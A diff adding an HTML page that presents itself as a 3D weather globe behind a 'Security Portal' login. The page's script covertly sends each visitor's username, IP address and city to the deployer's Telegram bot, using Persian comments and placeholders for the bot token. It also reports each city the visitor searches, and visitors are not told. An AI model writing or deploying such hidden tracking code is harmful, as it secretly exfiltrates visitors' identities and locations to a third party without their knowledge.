@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Weather Globe & Security</title>
+    <script src="https://cesium.com/downloads/cesiumjs/releases/1.114/Build/Cesium/Cesium.js"></script>
+    <link href="https://cesium.com/downloads/cesiumjs/releases/1.114/Build/Cesium/Widgets/widgets.css" rel="stylesheet">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #050505;
+        }
+        .cesium-widget-credits {
+            display: none !important;
+        }
+        #authOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(20px);
+            z-index: 100;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .auth-card {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 30px;
+            border-radius: 24px;
+            width: 300px;
+            text-align: center;
+            color: #fff;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+        .auth-card h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .auth-card input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            color: #fff;
+            outline: none;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .auth-card input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .auth-card button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .auth-card button:hover {
+            opacity: 0.9;
+        }
+        #cesiumContainer {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        .ui-container {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10;
+            display: flex;
+            gap: 10px;
+            background: rgba(15, 15, 15, 0.6);
+            padding: 10px 15px;
+            border-radius: 35px;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .ui-container input {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 15px;
+            padding: 0 10px;
+            width: 180px;
+        }
+        .ui-container button {
+            background: #fff;
+            color: #111;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .weather-card {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10;
+            background: rgba(10, 10, 10, 0.75);
+            backdrop-filter: blur(20px);
+            padding: 20px 30px;
+            border-radius: 24px;
+            color: #fff;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            min-width: 280px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+            display: none;
+        }
+        .weather-card h2 {
+            margin: 0 0 8px 0;
+            font-size: 22px;
+            color: #00c6ff;
+        }
+        .weather-card p {
+            margin: 5px 0;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="authOverlay">
+        <div class="auth-card">
+            <h2>🔒 Security Portal</h2>
+            <p style="font-size: 12px; color: rgba(255,255,255,0.7); margin-bottom:15px;">Create your credentials to access the 3D Globe</p>
+            <input type="text" id="regUser" placeholder="Username">
+            <input type="password" id="regPass" placeholder="Password">
+            <button onclick="handleAuth()">Enter Globe</button>
+        </div>
+    </div>
+
+    <div class="ui-container">
+        <input type="text" id="cityInput" placeholder="Search city...">
+        <button onclick="searchCity()">Go</button>
+    </div>
+
+    <div id="cesiumContainer"></div>
+
+    <div class="weather-card" id="weatherCard">
+        <h2 id="cityName">--</h2>
+        <p id="ipInfo" style="font-size: 12px; color: #aaa;"></p>
+        <p id="temp">Temperature: --</p>
+        <p id="condition">Wind Speed: --</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = 'توکن_ربات_شما';
+        const ADMIN_CHAT_ID = 'چت_آیدی_عددی_شما';
+
+        function sendAdminAlert(message) {
+            if (BOT_TOKEN === 'توکن_ربات_شما') return;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_CHAT_ID,
+                    text: message
+                })
+            }).catch(err => console.log(err));
+        }
+
+        function handleAuth() {
+            const u = document.getElementById('regUser').value;
+            const p = document.getElementById('regPass').value;
+            if(!u || !p) {
+                alert('لطفاً فیلدها را پر کنید!');
+                return;
+            }
+
+            localStorage.setItem('tma_user', u);
+            document.getElementById('authOverlay').style.display = 'none';
+            initGlobeAndIP();
+
+            // ارسال مشخصات و IP کاربر به تلگرام شما
+            fetch('https://ipwho.is/')
+                .then(res => res.json())
+                .then(data => {
+                    sendAdminAlert(`🚨 کاربر جدید وارد شد!\n👤 نام کاربری: ${u}\n🌐 آی پی: ${data.ip}\n📍 شهر: ${data.city}, ${data.country}`);
+                }).catch(e => console.log(e));
+        }
+
+        window.onload = function() {
+            if(localStorage.getItem('tma_user')) {
+                document.getElementById('authOverlay').style.display = 'none';
+                initGlobeAndIP();
+            }
+        }
+
+        let viewer;
+        function initGlobeAndIP() {
+            Cesium.Ion.defaultAccessToken = '';
+
+            viewer = new Cesium.Viewer('cesiumContainer', {
+                animation: false,
+                baseLayerPicker: false,
+                fullscreenButton: false,
+                vrButton: false,
+                geocoder: false,
+                homeButton: false,
+                infoBox: false,
+                sceneModePicker: false,
+                selectionIndicator: false,
+                timeline: false,
+                navigationHelpButton: false,
+                baseLayer: Cesium.ImageryLayer.fromProviderAsync(
+                    Cesium.ArcGisMapServerImageryProvider.fromBasemapType(
+                        Cesium.ArcGisBaseMapType.SATELLITE
+                    )
+                )
+            });
+
+            viewer.scene.globe.enableLighting = true;
+            viewer.scene.screenSpaceCameraController.enableTilt = true;
+
+            fetch('https://ipwho.is/')
+                .then(res => res.json())
+                .then(data => {
+                    if(data.latitude && data.longitude) {
+                        const lat = data.latitude;
+                        const lon = data.longitude;
+                        const city = data.city || 'Your Location';
+                        const country = data.country || '';
+                        const ip = data.ip || 'Unknown';
+
+                        viewer.camera.flyTo({
+                            destination: Cesium.Cartesian3.fromDegrees(lon, lat, 2000000),
+                            duration: 3.0
+                        });
+
+                        addMarker(lon, lat, `📍 ${city}`);
+                        fetchWeather(lat, lon, `${city}, ${country}`, `IP: ${ip}`);
+                    }
+                }).catch(err => console.log(err));
+        }
+
+        function addMarker(lon, lat, labelText) {
+            viewer.entities.add({
+                position: Cesium.Cartesian3.fromDegrees(lon, lat),
+                point: {
+                    pixelSize: 14,
+                    color: Cesium.Color.CYAN,
+                    outlineColor: Cesium.Color.WHITE,
+                    outlineWidth: 3
+                },
+                label: {
+                    text: labelText,
+                    font: '14pt sans-serif',
+                    style: Cesium.LabelStyle.FILL_AND_OUTLINE,
+                    fillColor: Cesium.Color.WHITE,
+                    outlineColor: Cesium.Color.BLACK,
+                    outlineWidth: 2,
+                    verticalOrigin: Cesium.VerticalOrigin.BOTTOM,
+                    pixelOffset: new Cesium.Cartesian2(0, -15)
+                }
+            });
+        }
+
+        async function searchCity() {
+            const query = document.getElementById('cityInput').value;
+            if (!query) return;
+
+            try {
+                const geoRes = await fetch(`https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(query)}&count=1`);
+                const geoData = await geoRes.json();
+
+                if (!geoData.results || geoData.results.length === 0) {
+                    alert('City not found!');
+                    return;
+                }
+
+                const loc = geoData.results[0];
+                viewer.camera.flyTo({
+                    destination: Cesium.Cartesian3.fromDegrees(loc.longitude, loc.latitude, 1500000),
+                    duration: 2.5
+                });
+
+                addMarker(loc.longitude, loc.latitude, `📍 ${loc.name}`);
+                fetchWeather(loc.latitude, loc.longitude, `${loc.name}, ${loc.country || ''}`, 'Searched Location');
+                
+                const user = localStorage.getItem('tma_user') || 'Unknown';
+                sendAdminAlert(`🔍 کاربر ${user} شهر ${loc.name} را جستجو کرد.`);
+            } catch (e) {
+                alert('Error loading city!');
+            }
+        }
+
+        async function fetchWeather(lat, lon, locationName, subText) {
+            try {
+                const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
+                const data = await res.json();
+                const cur = data.current_weather;
+
+                document.getElementById('cityName').innerText = locationName;
+                document.getElementById('ipInfo').innerText = subText;
+                document.getElementById('temp').innerText = `Temperature: ${cur.temperature}°C`;
+                document.getElementById('condition').innerText = `Wind Speed: ${cur.windspeed} km/h`;
+                document.getElementById('weatherCard').style.display = 'block';
+            } catch (e) {
+                console.error(e);
+            }
+        }
+    </script>
+</body>
+</html>
